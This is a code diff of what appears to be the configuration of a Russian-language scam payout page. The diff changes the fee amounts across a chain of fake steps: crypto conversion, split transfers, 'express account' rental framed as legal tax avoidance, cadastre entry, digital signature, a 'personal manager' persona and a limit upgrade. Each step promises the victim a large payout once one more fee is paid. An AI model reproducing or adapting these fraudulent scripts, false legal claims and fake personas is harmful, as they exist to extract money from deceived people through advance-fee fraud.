@@ -5191,11 +5191,11 @@
                 upsellType: "text",
                 product: 'Стоимость конвертации <span class="text-numbers">{{moneyBTC}}</span> в <span class="text-uppercase">{{converting_geoCur}}</span> составит',
                 amount: {
-                    e: 497,
-                    c: 498,
-                    h: 498,
-                    b: 498,
-                    p: 498
+                    e: 8,
+                    c: 8,
+                    h: 8,
+                    b: 8,
+                    p: 8
                 },
                 customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Отдаём  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Получаем <span class="text-numbers">{{convertedAmountUSD}}</span></b> </label> </div></div>',
                 instructions: ['Нажмите на кнопку "обменять BTC на <span class="text-uppercase">{{converting_geoCur}}</span>"', "Оплатите комиссию за обмен криптовалюты", "Получите ваши средства в долларах"],
@@ -5329,11 +5329,11 @@
                 },
                 product: "Комиссия, запрашиваемая за перевод составляет",
                 amount: {
-                    e: 689,
-                    c: 690,
-                    b: 690,
-                    p: 690,
-                    h: 690
+                    e: 11.5,
+                    c: 11.5,
+                    b: 11.5,
+                    p: 11.5,
+                    h: 11.5
                 },
                 customItem: "",
                 instructions: ["Гарантируем Вам быструю выплату", "Оплатите комиссии за перевод", "Получите вашу выплату в течении 10 минут"],
@@ -5453,11 +5453,11 @@
                 description: ['Первая часть перевода на сумму <b class="text-numbers">{{firstPart}}</b> отмечена как оплаченная', "Первый перевод не может быть отправлен, пока не будет оплачена комиссия за второй перевод!", "Как только Вы совершите оплату комиссии за второй перевод, оба перевода будут <b>отправлены</b> на указанные Вами реквизиты"],
                 product: 'Поскольку выплата разделена на две равные части, то второй перевод составит <span class="text-numbers font-weight-bold">{{secondPart}}</span>, комиссия за него <span class="text-numbers">(0,1% + 50 руб.)</span>, т.е.',
                 amount: {
-                    e: 690,
-                    c: 691,
-                    b: 691,
-                    p: 691,
-                    h: 691
+                    e: 11.7,
+                    c: 11.7,
+                    b: 11.7,
+                    p: 11.7,
+                    h: 11.7
                 },
                 customItem: "",
                 instructions: ["Гарантируем быстрый перевод", "Оплатите комиссию за второй перевод", "Получите вашу выплату целиком"],
@@ -5495,11 +5495,11 @@
                 description: ['Общие положения: Регистрация интеренет-прибыли в налоговом органе обязует получателя(Вас) оплатить НДФЛ(налог на доход физических лиц) в сумме 20% от общей прибыли. При этом, если прибыль не превышает <span class="text-numbers">{{geoMoney10Percent}}</span>., гражданин освобождается от уплаты налога.Чтобы отправить Вам перевод <span class="text-numbers">{{moneyPageBased}}</span> и не платить налог на доход физических лиц необходимо, чтобы средства Вы получили как экспресс перевод. В таком случае налог с них <b>не взимается</b>. Это предусмотрено законом и позволит Вам сохранить значительную часть денег.', "Чтобы воспользоваться такой услугой необходимо оплатить <b>аренду</b> надежного экспресс счета."],
                 product: "После аренды экспресс счета, средства будут переведены на указанные ранее реквизиты. Стоимость аренды экспресс счета на 1 день составляет",
                 amount: {
-                    e: 939,
-                    c: 940,
-                    b: 940,
-                    p: 940,
-                    h: 939
+                    e: 13,
+                    c: 13,
+                    b: 13,
+                    p: 13,
+                    h: 13
                 },
                 customItem: "",
                 instructions: ["Оплатите аренду экспресс счета", "Вывод будет совершен моментально", "Получите ваши средства"],
@@ -5524,11 +5524,11 @@
                 upsellType: "text",
                 product: "Стоимость внесения в кадастр всего",
                 amount: {
-                    e: 629,
-                    c: 630,
-                    b: 630,
-                    p: 630,
-                    h: 630
+                    e: 11,
+                    c: 11,
+                    b: 11,
+                    p: 11,
+                    h: 11
                 },
                 customItem: "",
                 instructions: ["Оплатите перевод в кадастр", "Деньги придут на указанный ранее счет моментально"],
@@ -5553,11 +5553,11 @@
                 upsellType: "text",
                 product: "Стоимость брони всего",
                 amount: {
-                    e: 791,
-                    c: 792,
-                    b: 792,
-                    p: 792,
-                    h: 792
+                    e: 13.2,
+                    c: 13.2,
+                    b: 13.2,
+                    p: 13.2,
+                    h: 13.2
                 },
                 customItem: "",
                 instructions: ["Оплатите бронь", "Получите средства на указанные реквизиты"],
@@ -5582,11 +5582,11 @@
                 upsellType: "text",
                 product: "Стоимость активации транзитной экспресс ячейки всего",
                 amount: {
-                    e: 990,
-                    c: 990,
-                    b: 990,
-                    p: 990,
-                    h: 990
+                    e: 16.75,
+                    c: 16.75,
+                    b: 16.75,
+                    p: 16.75,
+                    h: 16.75
                 },
                 customItem: "",
                 instructions: ["Оплатите активацию транзитной ячейки", "Система автоматический активирует ячейку", "Ваша выплата будет отправлена на ваши реквизиты"],
@@ -5611,11 +5611,11 @@
                 upsellType: "text",
                 product: "Стоимость услуг по генерации цифровой подписи всего",
                 amount: {
-                    e: 1109,
-                    c: 1110,
-                    b: 1110,
-                    p: 1110,
-                    h: 1110
+                    e: 18.5,
+                    c: 18.5,
+                    b: 18.5,
+                    p: 18.5,
+                    h: 18.5
                 },
                 customItem: "",
                 instructions: ["Оплатите услуги генерации подписи", "С помощью подписи система автоматически выведет Ваш платеж", "Получите Вашу выплату"],
@@ -5640,11 +5640,11 @@
                 upsellType: "text",
                 product: "Пополните сумму перевода на",
                 amount: {
-                    e: 822,
-                    c: 822,
-                    b: 822,
-                    p: 822,
-                    h: 822
+                    e: 13.5,
+                    c: 13.5,
+                    b: 13.5,
+                    p: 13.5,
+                    h: 13.5
                 },
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически проверит вашу подпись", "Ваша выплата будет отправлена на ваши реквизиты"],
@@ -5669,11 +5669,11 @@
                 upsellType: "text",
                 product: "Пополните сумму перевода на",
                 amount: {
-                    e: 1002,
-                    c: 1002,
-                    b: 1002,
-                    p: 1002,
-                    h: 1002
+                    e: 17,
+                    c: 17,
+                    b: 17,
+                    p: 17,
+                    h: 17
                 },
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически идентифицирует протокол TLS в вашем браузере", "Получите вашу выплату"],
@@ -5697,11 +5697,11 @@
                 description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Статус перевода:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Ожидает ручной отправки!</h3> </strong> </span> </h4>', "Автоматическая отправка денег не поддерживается платежной системой. Требуется ручная отправка денежного перевода на указанный Вами счет.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Менеджер сейчас в сети!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Полина Соловьева - <b>Менеджер</b></p><p style="font-size:25px;line-height:1.1">Стаж работы: <b>3 года</b></p><p style="font-size:25px;line-height:1.1">Статус: <b style="color:#80BB25">В сети</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Чтобы Вам отправили деньги вручную, наймите личного менеджера. Менеджер самостоятельно отправит Вам деньги с баланса вашего счета. </span></span></p><br><br></div>'), 'Сразу после оплаты услуг менеджера, будет отправлен денежный перевод на сумму <span class="text-numbers">{{moneyPageBased}}</span>'],
                 product: "Стоимость услуги личного менеджера всего",
                 amount: {
-                    e: 2251,
-                    c: 2250,
-                    b: 2250,
-                    p: 2250,
-                    h: 2251
+                    e: 37,
+                    c: 37,
+                    b: 37,
+                    p: 37,
+                    h: 37
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5726,11 +5726,11 @@
                 description: ['<h4 class="mt-0" style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><b>Статус перевода:</b><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:5px;padding-top:5px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Ожидает увеличения лимита!</h3> </strong> </span> </h4>', "Денежный перевод отклонен системой массовых выплат.Превышен лимит по сумме перевода. Для завершения перевода, увеличьте ваш лимит по денежным операциям.", '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Менеджер сейчас в сети!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p class="mb-0" style="font-size:25px;line-height:1.1">Полина Соловьева - <b>Менеджер</b></p><p style="font-size:25px;line-height:1.1">Стаж работы: <b>3 года</b></p><p style="font-size:25px;line-height:1.1">Статус: <b style="color:#80BB25">В сети</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Я сделала запрос в систему массовых выплат. У вас тариф "Стандарт". Там переводы не больше <b class="sMoney2">30 000 рублей</b> в сутки. Поэтому перевод сразу и не прошел, все еще находится в обработке.<br><br>Чтобы завершить перевод и получить деньги, увеличьте лимит по сумме перевода, подключив тариф "Максимум". Это стоит всего <b class="sMoney2"><span data-pay="price">{{upsellPrice}}</span> рублей</b>{{geoUpsellPrice}}. Как только подключите, они сразу отправят Вам деньги.</span></span></p></div>')],
                 product: 'Стоимость подключения тарифа "Максимум" всего',
                 amount: {
-                    e: 2190,
-                    c: 2190,
-                    b: 2190,
-                    p: 2190,
-                    h: 2190
+                    e: 36.5,
+                    c: 36.5,
+                    b: 36.5,
+                    p: 36.5,
+                    h: 36.5
                 },
                 customItem: "",
                 upsellType: "text",
@@ -5755,11 +5755,11 @@
                 description: ['<h4 style="margin-top:20px;color:black; text-transform: none;text-align: -webkit-center;"><div style="clear: both;"></div><br><b>Статус перевода:</b><br><span style="background-color: white;background-image: repeating-radial-gradient(circle at center, rgba(0,0,0,.2), rgba(0,0,0,.2) 1px, transparent 1px, transparent 100%);background-size: 4px 4px;"> <strong> <h3 class="fgfg" style="color:red;padding-bottom:20px;padding-top:10px;font-weight: 600;font-size:35px;margin-top: 0px;margin-bottom: 0px;">Заявка оформлена</h3> </strong> </span> </h4>', 'Заявка на перевод оформлена. Переводы, по сумме превышающие <b><span class="text-numbers">{{geoMoneyHalfLimit}}</span></b> поступают в течение 30 рабочих дней. Ожидайте поступления средств.', '<div style="width: 100%;box-shadow: 0 5px 20px rgba(0, 148, 190, 0.2);padding: 30px 30px 5px;margin: 0 auto 30px;border-bottom: 3px solid #00d4a3;"><div class="manager-info"><img src="'.concat(o, 'img/manager.jpg" alt="" title="Менеджер сейчас в сети!" style="width: 120px;height: 120px; border-radius: 10em; border: 5px solid #00d4a3; background-color: #00d4a3; margin-right: 20px; float: left; cursor: pointer; position: relative; display: block;" ><div class="manager-info-p"><p style="font-size:25px;line-height:1.1">Полина Соловьева - <b>Менеджер</b></p><p style="font-size:25px;line-height:1.1">Стаж работы: <b>3 года</b></p><p style="font-size:25px;line-height:1.1">Статус: <b style="color:#80BB25">В сети</b></p></div></div><div class="cb"></div><br><p> <span style="margin-top:10px;margin-bottom:20px;color:#808080"><span class="pay2">Конечно же, не удобно так долго ждать. Но такие условия у системы массовых выплат, к которой мы подключены.<br><br>Обычно наши пользователи не ждут, а подключают услугу "Мгновенный перевод" и сразу получают деньги. Она стоит <b class="sMoney2 text-numbers"><span>{{upsellPrice}}</span> рублей</b><span class="text-numbers">{{geoUpsellPrice}}</span>. Если вы тоже хотите получить перевод мгновенно, рекомендую подключить эту услугу и вам моментально поступят деньги.</span></span></p><br><br></div>')],
                 product: 'Стоимость услуги "Мгновенный перевод" всего',
                 amount: {
-                    e: 2990,
-                    c: 2990,
-                    b: 2990,
-                    p: 2990,
-                    h: 2990
+                    e: 58,
+                    c: 58,
+                    b: 58,
+                    p: 58,
+                    h: 58
                 },
                 customItem: "",
                 upsellType: "text",
